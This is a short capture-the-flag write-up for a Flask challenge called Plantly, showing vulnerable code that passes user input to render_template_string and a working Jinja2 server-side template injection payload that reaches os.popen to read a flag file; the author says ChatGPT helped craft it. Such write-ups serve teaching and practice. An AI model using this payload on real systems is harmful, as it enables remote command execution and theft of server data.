# Challenge Statement
![image](https://github.com/user-attachments/assets/fc1311c8-5cba-4670-ba07-c97b1634a257)

Attachment: [Plantly.zip](https://github.com/harishkannan05/SnykCTF-2024-Writeup/blob/main/Attachments/Plantly.zip)

# Solution
Going through the source code, we can see that there is a possibility of a SSTI (Server-Side Template Injection) Vulnerability.
```
custom_requests = "".join(
    f"<li>Custom Request: {render_template_string(purchase.custom_request)}</li>" 
    for purchase in purchases if purchase.custom_request
)
```
This code takes the user input `purchase.custom_request` and feeds it straight into Flask’s `render_template_string()` without any sanitization, which makes it vulnerable to executing user-provided template code on the server.

With a bit of help from ChatGPT to craft the payload, I was able to reveal the flag. 
Payload used - 
```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'WarningMessage' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read() }}{% endif %}{% endfor %}
```

![image](https://github.com/user-attachments/assets/95ca8435-9d14-4016-a558-8f511bc73d64)

